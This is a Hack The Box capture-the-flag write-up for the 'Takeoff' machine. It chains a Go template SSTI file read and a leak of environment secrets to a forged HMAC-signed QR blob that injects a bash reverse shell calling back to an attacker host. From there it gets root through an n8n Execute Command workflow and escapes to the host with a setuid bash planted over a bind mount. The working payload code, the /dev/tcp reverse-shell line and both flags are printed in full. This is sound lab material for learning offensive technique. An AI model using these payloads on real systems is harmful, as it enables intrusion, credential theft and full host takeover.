---
doc_kind: writeup
title: "HTB Takeoff - SSTI to env leak to HMAC forge to n8n root to bind-mount setuid escape"
category: web
slug: htb-takeoff-ssti-hmac-forge-n8n-bindmount
created: 2026-11-01
status: solved
tags:
  - ssti
  - go-template
  - file-read
  - env-leak
  - hmac-forge
  - qr-code-tampering
  - n8n
  - internal-automation-rce
  - bind-mount
  - setuid-escape
  - container-escape
source: "HTB (Pro Lab / machine, write-up PDF fourni par l'utilisateur)"
target: "10.129.24.211 / takeoff.htb"
---
# HTB Takeoff - SSTI to env leak to HMAC forge to n8n root to bind-mount setuid escape

## Challenge Summary

- Source: HTB (Pro Lab / machine, write-up PDF fourni par l'utilisateur, auteur L&_M@z4rt)
- Target: 10.129.24.211 / takeoff.htb (flight-booking web app)
- Goal: user flag then root flag on the host.
- Resolved: 2026-11-01.

## Initial Signals

- Entry point: a normal flight-booking flow (sign-up, search, book, pay) exposed on HTTP port 80; SSH (22) also open.
- Visible hints: a per-ticket "notes" field rendered server-side into a generated PDF, and a "check-in" flow that encodes a QR code in a hidden `qr_data` form field.
- First confirming probe: posting a Go template expression (`{{.File "/etc/passwd"}}`) into the notes field and downloading the generated PDF returned the file content instead of the literal string — confirmed server-side template execution with a file-read builtin.

## Exploit Chain

1. **Recon**: OpenVPN connect, full TCP nmap scan -> only 80/tcp (HTTP) and 22/tcp (SSH) open.
2. **App walkthrough**: create a lab account, search a flight, book a seat, add a fake passenger + test card, complete payment -> obtain a PNR (e.g. `K4QXT7`).
3. **SSTI -> file read**: `POST /tickets/{PNR}/notes` with `{{.File "/etc/passwd"}}` (Go `text/template`-style syntax), then `GET /tickets/{PNR}/download` and run `pdftotext` on the resulting PDF to read the injected file's content. Pivoted the same primitive to `{{.File "/proc/self/environ"}}` to dump the running process's environment variables, extracting `TICKET_VALIDATION_TOKEN` and `N8N_API_KEY` by regexing the decoded env blob — no RCE needed, just a file-read gadget plus a well-chosen target file.
4. **Forge the check-in QR**: fetch the current ticket's `qr_data` (Base64) from `/partials/check-in`. Decoded bytes are: a fixed "Gob" prefix, a JSON object starting at `{"PNR"`, a fixed "Gob" suffix, and a trailing 32-byte HMAC-SHA256 signature. Parsed the JSON with `json.JSONDecoder().raw_decode()` to get its exact byte span, added a new field `NotifyCmd` to the JSON, padded the new JSON with trailing spaces to match the original byte length exactly (so prefix/suffix framing stays valid), then recomputed `hmac.new(TICKET_VALIDATION_TOKEN, body, hashlib.sha256).digest()` over `prefix + new_json + suffix` and re-encoded to Base64. Verified the recomputed HMAC matched before submission.
5. **Command injection via NotifyCmd -> reverse shell**: `NotifyCmd` was set to a bash reverse-shell one-liner (`bash -c 'bash -i >& /dev/tcp/{LHOST}/4444 0>&1'`), the forged QR submitted to `POST /api/check-in` (`qr_data` + `gate: WEB`), with a `socat -d -d TCP-LISTEN:4444,bind="$LHOST",reuseaddr STDIO,raw,echo=0` listener already running on the attacker's VPN interface. The check-in handler executed the notify command server-side, producing a `www-data` shell. (A non-destructive first test used `NotifyCmd='touch /tmp/pwned'`, confirmed via the SSTI file-read primitive before attempting the reverse shell.)
6. **Pivot to n8n (root-in-container RCE)**: the leaked `N8N_API_KEY` authenticated against `n8n`'s REST API, bound only to localhost on port 5678 (`curl -H "X-N8N-API-KEY: $N8N_API_KEY" http://127.0.0.1:5678/api/v1/workflows?limit=100`). Created a temporary workflow with a `Webhook` node (GET, path `takeoff-diag`) wired to an `Execute Command` node, POSTed it to `/api/v1/workflows`, activated it, then triggered it via `GET /webhook/takeoff-diag`. The `Execute Command` node runs as root inside the n8n container.
7. **Discover the bind mount**: ran `id; hostname; pwd; mount | head -40` from the Execute Command node's output and inspected `/proc/1/mountinfo` with `awk '$8 !~ /^(proc|sysfs|tmpfs|devpts|mqueue|cgroup2)$/ {print "target="$5, "root="$4, "fs="$9}'` -> found `target=/root root=/home/kpark fs=ext4`, i.e. the n8n container's `/root` is bind-mounted to the host's `/home/kpark`, confirmed host-side with `grep ' /root ' /proc/mounts` (no `nosuid` option present).
8. **Deploy an SSH key as `kpark`**: generated a fresh `ed25519` keypair locally, then via another Execute Command workflow run wrote the public key into the container's `/root/.ssh/authorized_keys` (== host `/home/kpark/.ssh/authorized_keys`), making sure to `chown 1001:1001` the `.ssh` dir and `authorized_keys` file (UID/GID of `kpark` is 1001) — the first attempt with root ownership failed SSH auth. `ssh -i <key> kpark@10.129.24.211` then returned `uid=1001(kpark)` and the user flag.
9. **Root via setuid binary planted through the bind mount**: the n8n container had no `/bin/bash` so couldn't just chmod an existing binary; instead copied the host's native `/bin/bash` to `/home/kpark/.takeoff-root2` over SSH as `kpark` (copying over an in-use file or via SCP directly caused `Text file busy`, so the copy was done as a plain `cp` from the host side), verified identical SHA-256 to the host's real `/bin/bash`, then from an Execute Command n8n workflow (root in container) ran `chown 0:0 /root/.takeoff-root2 && chmod 4755 /root/.takeoff-root2` (container path, lands on the host file via the bind mount). Back in the `kpark` SSH session: `cd /home/kpark && ./.takeoff-root2 -p -c "id; cat /root/root.txt"` — the `-p` flag preserves the effective UID in bash, giving `euid=0(root)` and the root flag.
10. **Cleanup**: deactivated/deleted the temporary n8n workflows, removed the planted SSH public key from `authorized_keys` (and the now-empty `.ssh` dir), deleted the two setuid test binaries from `kpark`'s home, removed attacker-side temp files (PDFs, QR blobs, SSH keys), killed the `socat` listener and the OpenVPN tunnel.

## Key Evidence

- `{{.File "/etc/passwd"}}` injected into the notes field and reflected as actual `/etc/passwd` content in the generated+`pdftotext`-extracted PDF -> confirms Go template SSTI with a file-read builtin.
- `re.search('TICKET_VALIDATION_TOKEN=([^\s\x00]+)', text)` and same for `N8N_API_KEY` matching inside the `pdftotext`-extracted `/proc/self/environ` dump -> confirms both secrets are present in the target process's environment and readable via the SSTI primitive.
- `hmac.compare_digest(signature, hmac.new(key, body, hashlib.sha256).digest())` returning `True` before submission -> confirms the forged QR's HMAC is valid under the leaked `TICKET_VALIDATION_TOKEN`.
- Reverse shell connection landing with `id` showing `www-data` -> confirms the forged `NotifyCmd` field is executed server-side as a real command, not just stored.
- `awk` output over `/proc/1/mountinfo` showing `target=/root root=/home/kpark fs=ext4`, cross-checked with `grep ' /root ' /proc/mounts` on the host (`/dev/sda4 /root ext4 rw,relatime,errors=remount-ro 0 0`, no `nosuid`) -> confirms the exploitable bind mount and the absence of the mitigation that would have blocked the setuid escalation.
- `sha256sum` of the copied `/bin/bash` matching the host original, and `stat -c '%u:%g %a %s %n' /root/.takeoff-root2` showing `0:0 4755 <size> /root/.takeoff-root2` -> confirms the setuid root binary was correctly planted before execution.
- Final SSH command output `euid=0(root)` plus the printed contents of `/root/root.txt` -> confirms privilege escalation to root on the host.

## Dead Ends

- First SCP/SFTP copy of a binary into the container while a process might still reference it on disk caused `Text file busy`; fixed by copying the host's native `/bin/bash` to a new filename from the `kpark` host session instead of copying inside the container.
- First attempt to chmod a root-owned `authorized_keys`/`.ssh` dir for `kpark` failed SSH authentication silently; OpenSSH requires the authorized_keys file (and its parent dirs) to be owned by the login user (or root) with correct perms — fixed by `chown`ing to `kpark`'s actual UID/GID (1001:1001), not root.

## Payloads And Commands

```bash
# SSTI file-read probe and env-leak (Go-style template)
s.post(base + '/tickets/{PNR}/notes', data={'notes': '{{.File "/proc/self/environ"}}'})
pdf = s.get(base + '/tickets/{PNR}/download').content
text = subprocess.check_output(['pdftotext', '-layout', '-', '-'], input=pdf, text=True)
re.search(r'TICKET_VALIDATION_TOKEN=([^\s\x00]+)', text)

# HMAC-signed QR blob forge (Gob prefix/suffix framing + JSON + trailing 32-byte HMAC-SHA256)
raw = base64.b64decode(qr_data)
pos = raw.find(b'{"PNR"')
tail = raw[pos:-32]
obj, end = json.JSONDecoder().raw_decode(tail.decode())
old_json = tail[:end]
gob_suffix = tail[end:]
obj['NotifyCmd'] = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/4444 0>&1'"
new_json = json.dumps(obj, separators=(',', ':')).encode()
body = raw[:pos] + new_json + b' ' * (len(old_json) - len(new_json)) + gob_suffix
signature = hmac.new(TICKET_VALIDATION_TOKEN.encode(), body, hashlib.sha256).digest()
forged = base64.b64encode(body + signature).decode()
# POST forged to /api/check-in with {'qr_data': forged, 'gate': 'WEB'}

# n8n temporary Webhook -> Execute Command workflow (root-in-container RCE)
curl -sS -H "X-N8N-API-KEY: $N8N_API_KEY" -X POST --data-binary @workflow.json \
  http://127.0.0.1:5678/api/v1/workflows
curl -sS -X POST -H "X-N8N-API-KEY: $N8N_API_KEY" \
  "http://127.0.0.1:5678/api/v1/workflows/$WID/activate"
curl -sS http://127.0.0.1:5678/webhook/takeoff-diag

# Bind-mount discovery
awk '$8 !~ /^(proc|sysfs|tmpfs|devpts|mqueue|cgroup2)$/ {print "target="$5, "root="$4, "fs="$9}' /proc/1/mountinfo

# Setuid escape through the bind mount
chown 0:0 /root/.takeoff-root2 && chmod 4755 /root/.takeoff-root2   # run as root inside the container
ssh kpark@target './.takeoff-root2 -p -c "id; cat /root/root.txt"'  # -p preserves euid in bash
```

## Flag / Outcome

- User (`kpark`): `f10ddd383483d249da61099d1f51fe27`
- Root: `4ccd8578f424ab1e984298932a564856`

## Reusable Lessons

- A "render user text into a generated document" feature (PDF ticket, invoice, certificate, report) is always worth an SSTI probe for whatever template engine is in use, and once confirmed, the first move should be `/proc/self/environ`, not just `/etc/passwd` — env secrets (API keys, HMAC keys) often unlock far more than a local file read would.
- Any Base64 "opaque blob" carried in a hidden form field (QR data, signed token) that has fixed-length framing bytes around a JSON/structured payload is worth inspecting for a trailing HMAC/signature — if any leaked secret could plausibly be the key, forging it is often just: find the JSON span, edit while preserving exact byte length, recompute the HMAC.
- Once a backend secret leaks, always check whether it doubles as an API key for an internal-only automation/orchestration platform (n8n here) bound to localhost — these frequently offer a `Webhook -> Execute Command`-shaped RCE primitive that runs with elevated (often root) privileges inside its own container.
- After landing any shell inside a container, enumerate `/proc/1/mountinfo` for host bind mounts before trying anything else for privesc/escape — a bind-mounted `/root` (or similar) without `nosuid` set on the host side turns "root inside the container" directly into "root on the host" via a planted setuid binary.
- When planting a setuid binary via a shared mount, remember to run it with `bash -p` (or the exec'd shell's equivalent) to actually keep the effective UID from the setuid bit — a plain invocation some shells may silently drop privileges.

## Pattern Candidates

- New patterns created from this case:
  - `knowledge/patterns/web/ssti-file-read-proc-environ-secret-leak.md`
  - `knowledge/patterns/web/hmac-signed-blob-forging.md`
  - `knowledge/patterns/misc/internal-automation-api-key-rce-as-root.md`
  - `knowledge/patterns/misc/container-bindmount-setuid-escape.md`
- Existing pattern related but distinct: `knowledge/patterns/web/ssti-pdf-generation-jinja-self-globals.md` (same document-generation SSTI shape, different template engine/gadget — Jinja2 `self.__init__.__globals__` vs Go `.File`), and `knowledge/patterns/web/tengu-nodered-rce-root.md` (same "internal low-code automation platform = unauth/leaked-key RCE" shape as n8n here, worth cross-referencing for NCTF26 web triage).
